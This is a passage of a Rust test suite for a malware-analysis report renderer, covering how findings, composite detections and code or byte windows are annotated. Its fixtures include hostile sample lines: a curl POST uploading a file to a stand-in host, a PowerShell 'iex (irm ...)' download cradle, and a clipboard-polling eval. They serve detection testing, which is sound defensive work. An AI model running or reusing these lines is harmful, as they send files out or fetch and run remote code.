    let mut arm = exe(2, "/seed/arm64/zalocli", 99);
    for f in [&mut x64, &mut arm] {
        let id = format!("cat/trait::b{}", f.id);
        f.findings.push(finding_with(&id, Criticality::Notable));
        annotate(
            f,
            vec![ctx_line(
                1,
                "ZALO",
                Some(ctx_note(&id, Criticality::Notable, 1)),
            )],
        );
    }
    let output = render(&report_with_files(vec![x64, arm]));
    assert_eq!(
        output.matches("zalocli\t").count(),
        1,
        "one block for both builds\n{output}"
    );
    assert!(
        output.contains("b1 desc") && !output.contains("b2 desc"),
        "the higher-scored build\n{output}"
    );
}

/// An unreferenced component renders as context inside a top-five file, but
/// a file past the cap keeps the default gating — its lone component is not
/// resurrected as a note.
#[test]
fn tiny_shows_all_components_only_in_top_five_files() {
    let mut files: Vec<FileAnalysis> = (0..5)
        .map(|i| {
            let id = format!("cat/n::f{i}");
            let note = ctx_note(&id, Criticality::Notable, 1);
            src_file(
                i,
                &format!("/top{i}.py"),
                100 - i,
                vec![Finding {
                    desc: format!("top finding {i}").into(),
                    ..finding_with(&id, Criticality::Notable)
                }],
                vec![ctx_line(1, &format!("TOPCODE_{i} = work()"), Some(note))],
            )
        })
        .collect();

    // A top-five file additionally carrying an unreferenced component.
    let in_top = &mut files[0];
    in_top
        .findings
        .push(finding_with("blocks/c::shown", Criticality::Component));
    annotate(
        in_top,
        vec![ctx_line(
            20,
            "SHOWN_COMPONENT = side_effect()",
            Some(ctx_note("blocks/c::shown", Criticality::Component, 20)),
        )],
    );

    // A sixth file, past the cap, whose only extra signal is a component.
    files.push(src_file(
        5,
        "/tail.py",
        1,
        vec![
            Finding {
                desc: "tail notable".into(),
                ..finding_with("cat/n::tail", Criticality::Notable)
            },
            finding_with("blocks/c::hidden", Criticality::Component),
        ],
        vec![
            ctx_line(
                1,
                "TAILCODE = work()",
                Some(ctx_note("cat/n::tail", Criticality::Notable, 1)),
            ),
            ctx_line(
                20,
                "HIDDEN_COMPONENT = side_effect()",
                Some(ctx_note("blocks/c::hidden", Criticality::Component, 20)),
            ),
        ],
    ));

    let output = render(&report_with_files(files));
    assert!(
        output.contains("SHOWN_COMPONENT"),
        "a component in a top-five file renders as context\n{output}"
    );
    assert!(
        !output.contains("HIDDEN_COMPONENT"),
        "a capped file keeps default component gating\n{output}"
    );
}

/// A platform-signed file that raised nothing above notable is told by its
/// header and identity alone; anything suspicious on it is still shown.
#[test]
fn tiny_lists_no_capabilities_for_a_quiet_platform_signed_file() {
    let runtime_identity = identity(serde_json::json!({
        "name": {"value": "msvcp140.dll", "source": "pe.version.original_filename"},
        "organization": {"value": "Microsoft Corporation", "source": "pe.signatures[0]", "verified": true},
        "trust": "platform"
    }));
    let mut runtime = src_file(
        0,
        "/pkg.tgz!!bin/msvcp140.dll",
        30,
        vec![finding_with(
            "micro-behaviors/fs/file::position-api",
            Criticality::Notable,
        )],
        vec![ctx_line(
            1,
            "SetFilePointerEx",
            Some(ctx_note(
                "micro-behaviors/fs/file::position-api",
                Criticality::Notable,
                1,
            )),
        )],
    );
    runtime.identity = Some(runtime_identity);
    let tiny = render(&report_with_files(vec![runtime.clone()]));
    assert!(
        tiny.contains("msvcp140.dll"),
        "the header still names it: {tiny}"
    );
    assert!(!tiny.contains("position-api"), "no capability list: {tiny}");

    annotate(
        &mut runtime,
        vec![ctx_line(
            3,
            "CreateRemoteThread",
            Some(ctx_note(
                "objectives/evasion/process/injection::remote-thread",
                Criticality::Suspicious,
                3,
            )),
        )],
    );
    let tiny = render(&report_with_files(vec![runtime]));
    assert!(
        tiny.contains("remote-thread") || tiny.contains("evasion/process"),
        "{tiny}"
    );
}

/// A per-file analysis gap is for a reader deciding whether to trust
/// silence; the LLM view drops it. Nor does it name the directories above a
/// sample, the operator's filing (`hostile/`, `benign/`). (The plain half of
/// cleave's `tiny_omits_file_gap_lines_and_directories`.)
#[test]
fn tiny_omits_file_gap_lines_and_directories() {
    let mut file = src_file(
        0,
        "/corpus/samples/hostile/x.py",
        50,
        vec![],
        vec![ctx_line(
            1,
            "run()",
            Some(ctx_note("t/one", Criticality::Notable, 1)),
        )],
    );
    file.analysis_gaps = vec![AnalysisGap::FlowGraphLimited].into();
    let tiny = render(&report_with_files(vec![file]));
    assert!(!tiny.contains("Analysis incomplete"), "{tiny}");
    assert!(tiny.contains("run()"), "{tiny}");
    assert!(!tiny.contains("samples/hostile"), "{tiny}");
}

/// A finding with no captured window has no code to sit beside, so the file
/// renders nothing at all.
#[test]
fn tiny_omits_location_less_finding() {
    let findings = vec![Finding {
        kind: FindingKind::Capability,
        id: "micro-behaviors/process/create/shell::bash".into(),
        desc: "Execute shell commands".into(),
        conf: 0.9,
        crit: Criticality::Suspicious,
        evidence: vec![Evidence {
            method: "symbol".to_string(),
            source: "test".to_string(),
            value: "bash\nwith\twhitespace".to_string(),
            location: None,
            ..Default::default()
        }],
        match_count: 1,
        ..Default::default()
    }];
    let output = render(&create_test_report(findings));
    assert!(!output.contains("Execute shell commands"), "{output}");
    assert!(!output.contains("sample.bin"), "{output}");
}

/// What a file says it is for reaches the grader beside the matched lines,
/// even though no finding falls in it.
#[test]
fn tiny_draws_a_files_leading_comment_without_a_finding() {
    let mut file = hit_file(1, "/guard.js", 10, "SALT_KEY = 'pw_salt'");
    file.context.insert(
        0,
        leading_comment("/** Password Guard: keeps only a salted hash locally. */\n").line,
    );
    let output = render(&report_with_files(vec![file]));
    assert!(
        output.contains("Password Guard: keeps only a salted hash locally"),
        "{output}"
    );
    assert!(output.contains("SALT_KEY"), "{output}");
}

/// A header names a member archive-relative (`!!` read as `/`) and a root by
/// its basename alone.
#[test]
fn tiny_path_basenames_root_and_archive_relativizes_members() {
    assert_eq!(tiny_path("/tmp/a.zip!!lib/foo.so"), "a.zip/lib/foo.so");
    assert_eq!(tiny_path("/tmp/a.zip!!b.zip!!deep"), "a.zip/b.zip/deep");
    assert_eq!(tiny_path("/tmp/triage/x.bin"), "x.bin");
}

// ---------------------------------------------------------------------------
// Composite legs
// ---------------------------------------------------------------------------

/// Capture keeps only the strongest note on an overlapping span, so a
/// hostile composite anchored on its leg's evidence displaces the leg's own
/// note. The view then withholds the composite — and with it the only
/// located evidence. The composite's note now stands in for the leg.
#[test]
fn tiny_hands_a_withheld_composite_note_to_its_leg() {
    let leg = "micro/http/upload::curl-post-file";
    let mut composite = finding_with("objectives/exfil::skill-posts-file", Criticality::Hostile);
    composite.trait_refs = vec![leg.into()];
    let leg_finding = Finding {
        evidence: vec![Evidence::new("string", "", "curl").with_offset(12 * LINE_BYTES)],
        ..finding_with(leg, Criticality::Notable)
    };
    let file = src_file(
        0,
        "SKILL.md",
        50,
        vec![leg_finding, composite],
        vec![ctx_line(
            12,
            "curl -X POST https://h.example/a --data-binary @a\n",
            Some(ctx_note(
                "objectives/exfil::skill-posts-file",
                Criticality::Hostile,
                12,
            )),
        )],
    );
    let tiny = render(&report_with_files(vec![file]));
    assert!(
        tiny.contains("--data-binary @a"),
        "the leg's matched line must render: {tiny}"
    );
    assert!(
        tiny.contains("# N 12:1 micro/http/upload::curl-post-file"),
        "the window is annotated with the leg, not the composite: {tiny}"
    );
    assert!(
        !tiny.contains("skill-posts-file"),
        "the composite stays withheld: {tiny}"
    );
}

/// Two elevated findings on one source line each get their annotation;
/// keeping only the strongest note per row hid the other.
#[test]
fn tiny_announces_every_elevated_note_on_a_shared_line() {
    let a = "objectives/exec::decode-exec";
    let b = "objectives/evasion::debugger-abort";
    let mut line = ctx_line(1, "exec(d(p)) if not trace() else exit()\n", None);
    line.notes = vec![
        ctx_note(a, Criticality::Hostile, line.line.loc),
        ctx_note(b, Criticality::Suspicious, line.line.loc + 18), // `trace`
    ];
    let file = src_file(
        0,
        "x.py",
        50,
        vec![
            finding_with(a, Criticality::Hostile),
            finding_with(b, Criticality::Suspicious),
        ],
        vec![line],
    );
    let tiny = render(&report_with_files(vec![file]));
    assert!(tiny.contains(&format!("# H 1:1 {a}")), "{tiny}");
    assert!(tiny.contains(&format!("# S 1:19 {b}")), "{tiny}");
    assert_eq!(
        tiny.matches(&format!("({b})")).count(),
        1,
        "shown once, not rostered again: {tiny}"
    );
}

/// A hostile composite over component legs that share a line with a
/// stronger note: both legs are announced on that line, and nothing names
/// the composite.
#[test]
fn tiny_shows_component_legs_of_a_withheld_composite() {
    let strong = "micro/exec::eval-call";
    let (a, b) = ("micro/io::read-clipboard", "micro/time::set-interval");
    let comp = "objectives/steal::clipboard-poll-exfil";
    let composite = Finding {
        trait_refs: vec![a.into(), b.into()],
        ..finding_with(comp, Criticality::Hostile)
    };
    let mut line = ctx_line(
        3,
        "setInterval(()=>eval(navigator.clipboard.readText()))\n",
        None,
    );
    line.notes = vec![
        ctx_note(strong, Criticality::Notable, line.line.loc + 16), // `eval`
        ctx_note(a, Criticality::Component, line.line.loc + 41),    // `readText`
        ctx_note(b, Criticality::Component, line.line.loc),
    ];
    let file = src_file(
        0,
        "bg.js",
        50,
        vec![
            finding_with(strong, Criticality::Notable),
            finding_with(a, Criticality::Component),
            finding_with(b, Criticality::Component),
            composite,
        ],
        vec![line],
    );
    let tiny = render(&report_with_files(vec![file]));
    assert!(tiny.contains(&format!("# N 3:17 {strong}")), "{tiny}");
    assert!(tiny.contains(&format!("# C 3:42 {a}")), "{tiny}");
    assert!(tiny.contains(&format!("# C 3:1 {b}")), "{tiny}");
    assert!(!tiny.contains(comp) && !tiny.contains("# H"), "{tiny}");
}

/// Legs resolve through a nested composite to its atoms; neither
/// composite's id reaches the render.
#[test]
fn tiny_resolves_nested_composites_to_their_atoms() {
    let top = "objectives/exfil::wallet-exfil";
    let mid = "micro/ui::credential-surface";
    let (label, post) = ("micro/ui::mnemonic-label", "micro/http::post");
    let file = src_file(
        0,
        "x.js",
        50,
        vec![
            Finding {
                trait_refs: vec![mid.into(), post.into()],
                ..finding_with(top, Criticality::Hostile)
            },
            Finding {
                trait_refs: vec![label.into()],
                ..finding_with(mid, Criticality::Notable)
            },
            finding_with(label, Criticality::Component),
            finding_with(post, Criticality::Baseline),
        ],
        vec![
            ctx_line(
                1,
                "showMnemonic()",
                Some(ctx_note(label, Criticality::Component, 1)),
            ),
            ctx_line(
                3,
                "post(url)",
                Some(ctx_note(post, Criticality::Baseline, 3)),
            ),
        ],
    );
    let tiny = render(&report_with_files(vec![file]));
    assert!(tiny.contains(&format!("({label})")), "{tiny}");
    assert!(tiny.contains(&format!("({post})")), "{tiny}");
    assert!(!tiny.contains(top) && !tiny.contains(mid), "{tiny}");
}

/// An archive-scope composite pools legs from two members: each leg
/// renders in the member it matched in, not on the container.
#[test]
fn tiny_places_cross_member_legs_in_their_members() {
    let comp = "objectives/exfil::form-to-http";
    let (form, send) = ("micro/ui::form-input", "micro/http::fetch-post");
    let mut root = src_file(
        0,
        "/s/ext.zip",
        90,
        vec![
            Finding {
                trait_refs: vec![form.into(), send.into()],
                ..finding_with(comp, Criticality::Hostile)
            },
            // The container's inherited copies of its members' legs.
            Finding {
                src: Some(1),
                ..finding_with(form, Criticality::Component)
            },
            Finding {
                src: Some(2),
                ..finding_with(send, Criticality::Component)
            },
        ],
        vec![],
    );
    root.file_type = "zip".to_string();
    root.composite_sources.insert(
        comp.to_string(),
        serde_json::from_value(serde_json::json!([{"file": 1}, {"file": 2}]))
            .expect("composite sources"),
    );
    let member = |id: u32, name: &str, leg: &str| {
        let mut m = src_file(
            id,
            &format!("/s/ext.zip!!{name}"),
            10,
            vec![finding_with(leg, Criticality::Component)],
            vec![ctx_line(
                1,
                "handle(input)",
                Some(ctx_note(leg, Criticality::Component, 1)),
            )],
        );
        m.depth = 1;
        m.parent_id = Some(0);
        m
    };
    let files = vec![root, member(1, "login.js", form), member(2, "app.js", send)];
    let tiny = render(&report_with_files(files));
    // A member's block: from its header to the next file header.
    let block = |name: &str| {
        let rest = tiny
            .find(&format!("ext.zip/{name}\t"))
            .and_then(|start| tiny.get(start..))
            .unwrap_or("");
        let end = rest
            .get(1..)
            .and_then(|r| r.find("ext.zip/"))
            .map_or(rest.len(), |i| i + 1);
        rest.get(..end).unwrap_or("").to_string()
    };
    assert!(block("login.js").contains(&format!("({form})")), "{tiny}");
    assert!(block("app.js").contains(&format!("({send})")), "{tiny}");
    assert!(!tiny.contains(comp), "{tiny}");
}

/// A composite's note covers the one leg it was anchored on. Its other legs
/// match elsewhere, so handing them the note would label a line with a trait
/// that is not its evidence. With no window of their own they have no code
/// to sit beside, so the view does not list them at all.
#[test]
fn tiny_relabel_hands_a_composite_note_only_to_legs_it_covers() {
    let a = "micro/tunnel::quick-service";
    let b = "micro/paste::shz-al";
    let comp = "objectives/c2::tunnel-address-paste-rendezvous";
    let leg = |id: &str, off: u64, value: &str| Finding {
        evidence: vec![Evidence::new("string", "", value).with_offset(off)],
        ..finding_with(id, Criticality::Notable)
    };
    let composite = Finding {
        trait_refs: vec![a.into(), b.into()],
        ..finding_with(comp, Criticality::Suspicious)
    };
    let file = src_file(
        0,
        "agent.py",
        50,
        vec![
            leg(a, 12 * LINE_BYTES, "trycloudflare"),
            leg(b, 900, "shz.al"),
            composite,
        ],
        vec![ctx_line(
            12,
            "QUICK_SERVICE = 'https://api.trycloudflare.com'\n",
            Some(ctx_note(comp, Criticality::Suspicious, 12)),
        )],
    );
    let tiny = render(&report_with_files(vec![file]));
    assert!(
        tiny.contains(&format!("# N 12:1 {a}")),
        "the covered leg takes the note: {tiny}"
    );
    assert!(
        !tiny.contains(&format!("12:1 {b}")),
        "the uncovered leg is not labeled onto the anchor line: {tiny}"
    );
    assert!(
        !tiny.contains(b),
        "an uncovered leg with no window renders no bare note: {tiny}"
    );
    assert!(
        !tiny.contains("rendezvous"),
        "the composite stays withheld: {tiny}"
    );
}

/// Each leg of a withheld composite labels the line at its own column:
/// notes come from the final findings, so a leg with its own span is never
/// left unnamed under the composite's note.
#[test]
fn tiny_labels_each_leg_of_a_withheld_composite_at_its_own_column() {
    let a = "micro/ps::iex";
    let b = "micro/ps::irm-alias";
    let comp = "objectives/exec::download-cradle";
    let leg = |id: &str, off: u64, value: &str| Finding {
        evidence: vec![Evidence::new("string", "", value).with_offset(off)],
        ..finding_with(id, Criticality::Notable)
    };
    let composite = Finding {
        trait_refs: vec![a.into(), b.into()],
        ..finding_with(comp, Criticality::Suspicious)
    };
    // One drawn line holds both legs; the composite's note covers only A.
    let file = src_file(
        0,
        "sample.ps1",
        50,
        vec![leg(a, 0, "iex"), leg(b, 5, "irm"), composite],
        vec![ctx_line(
            0,
            "iex (irm https://h.example/p)\n",
            Some(ctx_note(comp, Criticality::Suspicious, 0)),
        )],
    );
    let tiny = render(&report_with_files(vec![file]));
    assert!(
        tiny.contains("irm https://h.example/p"),
        "line drawn: {tiny}"
    );
    assert!(
        tiny.contains(&format!("0:1 {a}")),
        "A labels the line: {tiny}"
    );
    assert!(
        tiny.contains(&format!("0:6 {b}")),
        "B labels its own column: {tiny}"
    );
    assert!(!tiny.contains(comp), "{tiny}");
}

/// Composite backing propagates through nested composites: an atom two
/// composites deep takes the outer composite's criticality, and each
/// composite counts once.
#[test]
fn withheld_composite_support_propagates_through_nested_composites() {
    let outer = Finding {
        trait_refs: vec!["objectives/inner".into()],
        ..finding_with("objectives/outer", Criticality::Hostile)
    };
    let inner = Finding {
        trait_refs: vec!["micro/atom".into()],
        ..finding_with("objectives/inner", Criticality::Suspicious)
    };
    let file = src_file(
        0,
        "a.py",
        50,
        vec![
            outer,
            inner,
            finding_with("micro/atom", Criticality::Notable),
        ],
        vec![],
    );
    let got = withheld_composite_support(&file, &HashSet::new());
    let hostile = Criticality::Hostile.rank();
    assert_eq!(
        got.get("micro/atom"),
        Some(&CompositeSupport {
            rank: hostile,
            composites: 2
        })
    );
    assert_eq!(
        got.get("objectives/inner"),
        Some(&CompositeSupport {
            rank: hostile,
            composites: 1
        })
    );
    assert_eq!(got.get("objectives/outer"), None);
}

/// A trait's family is its namespace plus the next segments; a shorter path
/// is its own family.
#[test]
fn trait_family_takes_segments_below_the_namespace() {
    let id = "objectives/command-and-control/infrastructure/paste::shz-al";
    assert_eq!(
        trait_family(id, 2),
        "objectives/command-and-control/infrastructure"
    );
    assert_eq!(
        trait_family(id, 3),
        "objectives/command-and-control/infrastructure/paste"
    );
    assert_eq!(trait_family("t/one", 3), "t/one");
}

// ---------------------------------------------------------------------------
// Window picks
// ---------------------------------------------------------------------------

/// A window the per-file cap declines to draw takes its annotation with it:
/// the view draws no annotation without its code.
#[test]
fn tiny_window_cap_drops_capped_annotations() {
    let ctx = |i: u64, id: &str| {
        ctx_line(
            i * 100,
            "payload_line_with_enough_code(x)\n",
            Some(ctx_note(id, Criticality::Notable, i * 100)),
        )
    };
    let mut file = src_file(
        0,
        "a.py",
        50,
        vec![
            finding_with("t/one", Criticality::Notable),
            finding_with("t/two", Criticality::Notable),
            finding_with("t/three", Criticality::Notable),
        ],
        vec![ctx(1, "t/one"), ctx(2, "t/two"), ctx(3, "t/three")],
    );
    for (f, c) in file.findings.iter_mut().zip([0.9, 0.8, 0.7]) {
        f.conf = c;
    }
    let tiny = render_budgeted(&file, 1, WINDOW_BYTES);
    assert_eq!(
        tiny.matches("payload_line_with_enough_code").count(),
        1,
        "one window drawn: {tiny}"
    );
    assert!(
        tiny.contains("t/one"),
        "the strongest window is drawn: {tiny}"
    );
    for id in ["t/two", "t/three"] {
        assert!(!tiny.contains(id), "{id} has no window, so no note: {tiny}");
    }
}

/// The byte budget keeps the strongest windows that fit and drops the rest,
/// annotations included; a weaker window that still fits is not skipped.
#[test]
fn tiny_window_byte_budget_keeps_strongest_that_fit() {
    let big = "x".repeat(300);
    let mk = |i: u64, id: &str, data: &str, conf: f32| {
        let mut l = ctx_line(
            i * 1000,
            data,
            Some(ctx_note(id, Criticality::Notable, i * 1000)),
        );
        l.notes[0].conf = conf;
        l
    };
    let mut file = src_file(
        0,
        "a.py",
        50,
        vec![
            finding_with("t/strong", Criticality::Notable),
            finding_with("t/mid", Criticality::Notable),
            finding_with("t/weak", Criticality::Notable),
        ],
        vec![
            mk(1, "t/strong", &format!("strong_call({big})\n"), 0.9),
            mk(2, "t/mid", &format!("mid_call({big})\n"), 0.8),
            mk(3, "t/weak", "weak_call(short_enough)\n", 0.7),
        ],
    );
    for (f, c) in file.findings.iter_mut().zip([0.9, 0.8, 0.7]) {
        f.conf = c;
    }
    let tiny = render_budgeted(&file, MAX_WINDOWS, 400);
    assert!(
        tiny.contains("strong_call("),
        "strongest window drawn: {tiny}"
    );
    assert!(
        !tiny.contains("mid_call("),
        "second 300-byte window overspends: {tiny}"
    );
    assert!(
        tiny.contains("weak_call("),
        "a weaker window that fits is drawn: {tiny}"
    );
    assert!(
        !tiny.contains("t/mid"),
        "the budgeted-out finding renders no bare note: {tiny}"
    );
}

/// Criticality wins: one suspicious window beats notable windows however
/// confident, compact or diverse they are.
#[test]
fn tiny_window_pick_prefers_criticality_over_everything_else() {
    let mut context = vec![story_line(
        900,
        &format!("suspicious_call({})\n", "x".repeat(200)),
        "objectives/evasion/history::off",
        Criticality::Suspicious,
        0.5,
    )];
    for (i, fam) in ["net/http", "fs/write", "process/create", "crypto/aes"]
        .iter()
        .enumerate()
    {
        context.push(story_line(
            i as u64 + 1,
            &format!("notable_{i}()\n"),
            &format!("micro-behaviors/{fam}::n{i}"),
            Criticality::Notable,
            0.95,
        ));
    }
    context.sort_by_key(|w| w.line.loc);
    let tiny = render_budgeted(&story_file(context, vec![]), 1, WINDOW_BYTES);
    assert!(
        tiny.contains("suspicious_call("),
        "suspicious drawn: {tiny}"
    );
    assert!(!tiny.contains("notable_0()"), "no notable window: {tiny}");
}

/// Within one criticality, a window from a family not yet drawn beats a
/// slightly more confident one repeating a family already shown.
#[test]
fn tiny_window_pick_spreads_across_families() {
    let context = vec![
        story_line(
            1,
            "first_http(a)\n",
            "micro-behaviors/net/http::a",
            Criticality::Notable,
            0.9,
        ),
        story_line(
            2,
            "again_http(b)\n",
            "micro-behaviors/net/http::b",
            Criticality::Notable,
            0.85,
        ),
        story_line(
            3,
            "write_file(c)\n",
            "micro-behaviors/fs/write::c",
            Criticality::Notable,
            0.8,
        ),
    ];
    let tiny = render_budgeted(&story_file(context, vec![]), 2, WINDOW_BYTES);
    assert!(tiny.contains("first_http(a)"), "best window drawn: {tiny}");
    assert!(tiny.contains("write_file(c)"), "new family drawn: {tiny}");
    assert!(
        !tiny.contains("again_http(b)"),
        "repeat family skipped: {tiny}"
    );
    assert!(
        !tiny.contains("micro-behaviors/net/http::b"),
        "the skipped finding renders no bare note: {tiny}"
    );
}

/// A withheld composite's leg outranks an equally graded, more confident
/// unreferenced note — whether the leg holds its own note or was handed
/// the composite's — yet its window carries only the leg's own label.
#[test]
fn tiny_window_pick_ranks_legs_by_their_withheld_composite() {
    let leg = "objectives/command-and-control/infrastructure/paste::shz-al";
    let comp = "objectives/command-and-control/channel/rendezvous::paste";
    for relabeled in [false, true] {
        let composite = Finding {
            trait_refs: vec![leg.into()],
            conf: 0.8,
            ..finding_with(comp, Criticality::Suspicious)
        };
        let leg_finding = Finding {
            conf: 0.7,
            evidence: vec![Evidence::new("string", "", "shz.al").with_offset(50 * LINE_BYTES)],
            ..finding_with(leg, Criticality::Notable)
        };
        let (id, crit, conf) = if relabeled {
            (comp, Criticality::Suspicious, 0.8)
        } else {
            (leg, Criticality::Notable, 0.7)
        };
        let leg_line = story_line(50, "PASTE = 'https://shz.al/x'\n", id, crit, conf);
        let other = story_line(
            1,
            "requests.get(url)\n",
            "micro-behaviors/net/http::get",
            Criticality::Notable,
            0.95,
        );
        let mut file = story_file(vec![other], vec![leg_finding, composite]);
        annotate(&mut file, vec![leg_line]);
        let tiny = render_budgeted(&file, 1, WINDOW_BYTES);
        assert!(
            tiny.contains("shz.al"),
            "relabeled={relabeled}: leg drawn: {tiny}"
        );
        assert!(
            !tiny.contains("requests.get(url)"),
            "relabeled={relabeled}: unreferenced note not drawn: {tiny}"
        );
        assert!(
            tiny.contains(&format!("# N 50:1 {leg}")),
            "relabeled={relabeled}: the leg's own grade and id: {tiny}"
        );
        assert!(
            !tiny.contains("rendezvous") && !tiny.contains("# S ") && !tiny.contains("# H "),
            "relabeled={relabeled}: no composite id or grade leaks: {tiny}"
        );
    }
}

/// An import note no composite draws on earns no window on a budgeted
/// file, however confident, and so no annotation either.
#[test]
fn tiny_window_pick_skips_metadata_only_windows() {
    let import = "metadata/import/python/subprocess::subprocess";
    let context = vec![
        story_line(1, "import subprocess\n", import, Criticality::Notable, 0.95),
        story_line(
            10,
            "requests.get(url)\n",
            "micro-behaviors/net/http::get",
            Criticality::Notable,
            0.5,
        ),
        story_line(
            20,
            "open(p, 'w')\n",
            "micro-behaviors/fs/write::open",
            Criticality::Notable,
            0.5,
        ),
    ];
    let tiny = render_budgeted(&story_file(context, vec![]), 2, WINDOW_BYTES);
    assert!(
        !tiny.contains("import subprocess"),
        "import not drawn: {tiny}"
    );
    assert!(tiny.contains("requests.get(url)"), "behavior drawn: {tiny}");
    assert!(tiny.contains("open(p, 'w')"), "behavior drawn: {tiny}");
    assert!(!tiny.contains(import), "no windowless import note: {tiny}");
}

/// Equal candidates across families and tiers render identically run to
/// run, whatever order the hash maps iterate in — under a cap and through
/// the full render.
#[test]
fn tiny_window_pick_is_deterministic() {
    let context: Vec<Win> = (0..40u64)
        .map(|i| {
            story_line(
                i * 10 + 1,
                &format!("call_{i}(arg)\n"),
                &format!("micro-behaviors/f{}/g{}::t{i}", i % 5, i % 3),
                Criticality::Notable,
                0.8,
            )
        })
        .collect();
    let file = story_file(context, vec![]);
    let first = render_budgeted(&file, 7, WINDOW_BYTES);
    assert_eq!(first.matches("call_").count(), 7, "{first}");
    let report = report_with_files(vec![file]);
    let full = render(&report);
    for _ in 0..20 {
        assert_eq!(render_budgeted(&report.files[0], 7, WINDOW_BYTES), first);
        assert_eq!(render(&report), full);
    }
}

// ---------------------------------------------------------------------------
// Binary blocks
// ---------------------------------------------------------------------------

/// A component trait no composite drew on shows only its own line — no
/// before/after context — even though neighbors carry real code.
#[test]
fn tiny_unmatched_component_shows_single_line() {
    let notable = ctx_note("cat/n::hit", Criticality::Notable, 1);
    let comp = ctx_note("blocks/c::lone", Criticality::Component, 10);
    let file = src_file(
        0,
        "/only.py",
        50,
        vec![
            Finding {
                desc: "real finding".into(),
                ..finding_with("cat/n::hit", Criticality::Notable)
            },
            finding_with("blocks/c::lone", Criticality::Component),
        ],
        vec![
            ctx_line(1, "anchor = notable_here()", Some(notable)),
            ctx_line(9, "NEIGHBOR_BEFORE = setup()", None),
            ctx_line(10, "COMPONENTLINE = import_os()", Some(comp)),
            ctx_line(11, "NEIGHBOR_AFTER = teardown()", None),
        ],
    );
    let output = render(&report_with_files(vec![file]));
    assert!(
        output.contains("COMPONENTLINE"),
        "the component's own line shows\n{output}"
    );
    assert!(
        !output.contains("NEIGHBOR_BEFORE") && !output.contains("NEIGHBOR_AFTER"),
        "an unmatched component gets no surrounding context\n{output}"
    );
}

/// A single merged byte window carrying several traits lists every
/// description ahead of its bytes, worst first, each with the hex offset
/// that locates it in the rows below.
#[test]
fn tiny_binary_lists_all_descriptions_ahead_of_merged_block() {
    let data: Vec<u8> = (0u8..80).collect(); // bytes 0x41.. render as ABC… in-block
    let file = bin_file(
        0,
        90,
        vec![
            finding_with("net/connect", Criticality::Notable),
            finding_with("exec/shell", Criticality::Suspicious),
        ],
        vec![byte_unit(
            0,
            &data,
            vec![
                ctx_note("net/connect", Criticality::Notable, 20),
                ctx_note("exec/shell", Criticality::Suspicious, 40),
            ],
        )],
    );
    let output = render(&report_with_files(vec![file]));

    let s_desc = output
        .find("exec/shell desc")
        .expect("suspicious desc shown");
    let n_desc = output.find("net/connect desc").expect("notable desc shown");
    let block = output.find("ABCDEFG").expect("byte block rendered");
    assert!(s_desc < n_desc, "strongest description first:\n{output}");
    assert!(
        n_desc < block,
        "every description precedes the block's bytes:\n{output}"
    );
    // Each carries the hex offset of its match — 20 and 40 decimal.
    assert!(
        output.contains("14 net/connect desc") && output.contains("28 exec/shell desc"),
        "each description carries its hex match offset:\n{output}"
    );
}

/// One captured window splits into a block per contiguous run its own
/// annotations cover: a gap between detections ends the block, so no block
/// holds bytes no annotation accounts for.
#[test]
fn tiny_binary_splits_a_merged_window_into_contiguous_blocks() {
    let mut data = vec![b'.'; 1024];
    data[100..108].copy_from_slice(b"NEAR_LOW");
    data[900..909].copy_from_slice(b"NEAR_HIGH");
    let file = bin_file(
        0,
        2048,
        vec![
            finding_with("low/hit", Criticality::Notable),
            finding_with("high/hit", Criticality::Notable),
        ],
        vec![byte_unit(
            0,
            &data,
            vec![
                ctx_note("low/hit", Criticality::Notable, 100),
                ctx_note("high/hit", Criticality::Notable, 900),
            ],
        )],
    );
    let out = render(&report_with_files(vec![file]));

    let low_desc = out.find("low/hit desc").expect("low annotation");
    let low_bytes = out.find("NEAR_LOW").expect("low bytes");
    let high_desc = out.find("high/hit desc").expect("high annotation");
    let high_bytes = out.find("NEAR_HIGH").expect("high bytes");
    assert!(
        low_desc < low_bytes && low_bytes < high_desc && high_desc < high_bytes,
        "each block must follow its own annotations:\n{out}",
    );

    let rows: Vec<u64> = out
        .lines()
        .filter_map(|l| {
            let (gutter, rest) = l.split_once(['-', ':'])?;
            rest.starts_with(' ')
                .then(|| u64::from_str_radix(gutter, 16).ok())
                .flatten()
        })
        .collect();
    assert!(!rows.is_empty(), "no rows rendered:\n{out}");
    assert!(
        rows.iter().all(|off| *off < 300 || *off > 700),
        "the unannotated span between blocks must not be rendered: {rows:?}\n{out}",
    );
}

/// Two non-overlapping byte windows render as separate blocks, each with its
/// own detection listed ahead of it, in file order.
#[test]
fn tiny_binary_separates_independent_blocks() {
    let file = bin_file(
        0,
        90,
        vec![
            finding_with("first/hit", Criticality::Suspicious),
            finding_with("second/hit", Criticality::Hostile),
        ],
        vec![
            byte_unit(
                0,
                b"AAAAAAAAAAAAAAAA",
                vec![ctx_note("first/hit", Criticality::Suspicious, 4)],
            ),
            byte_unit(
                4096,
                b"BBBBBBBBBBBBBBBB",
                vec![ctx_note("second/hit", Criticality::Hostile, 4100)],
            ),
        ],
    );
    let output = render(&report_with_files(vec![file]));

    let a_desc = output.find("first/hit desc").expect("block A described");
    let a_bytes = output.find("AAAAAAAA").expect("block A bytes");
    let b_desc = output.find("second/hit desc").expect("block B described");
    let b_bytes = output.find("BBBBBBBB").expect("block B bytes");
    assert!(
        a_desc < a_bytes && a_bytes < b_desc && b_desc < b_bytes,
        "each block's description leads its own bytes, blocks in file order:\n{output}"
    );
}

/// A binary window's annotations carry their match offset in the same hex
/// the row gutter uses, in byte order, and a row a detection matched in is
/// marked `:` rather than `-`.
#[test]
fn binary_annotations_carry_offsets_that_locate_them_in_the_rows() {
    let mut report = create_test_report(vec![
        finding_with("t/late", Criticality::Notable),
        finding_with("t/early", Criticality::Notable),
    ]);
    // The printable-byte view is chosen by file type; the canonical labels
    // are lowercase (`macho`, `elf`), which is what a real report carries.
    report.files[0].file_type = "elf".to_string();
    annotate(
        &mut report.files[0],
        vec![byte_unit(
            0x1000,
            &[b'A'; 192],
            vec![
                ctx_note("t/late", Criticality::Notable, 0x1050),
                ctx_note("t/early", Criticality::Notable, 0x1005),
            ],
        )],
    );

    let out = render(&report);
    let annotations: Vec<&str> = out.lines().filter(|l| l.starts_with("// ")).collect();
    assert_eq!(
        annotations,
        vec![
            "// N 1005 t/early desc (t/early)",
            "// N 1050 t/late desc (t/late)",
        ],
        "annotations must carry their hex offset, in byte order: {out}",
    );

    let rows: Vec<(u64, char)> = out
        .lines()
        .filter_map(|l| {
            let (gutter, rest) = l.split_once(['-', ':'])?;
            let marker = l.as_bytes()[gutter.len()] as char;
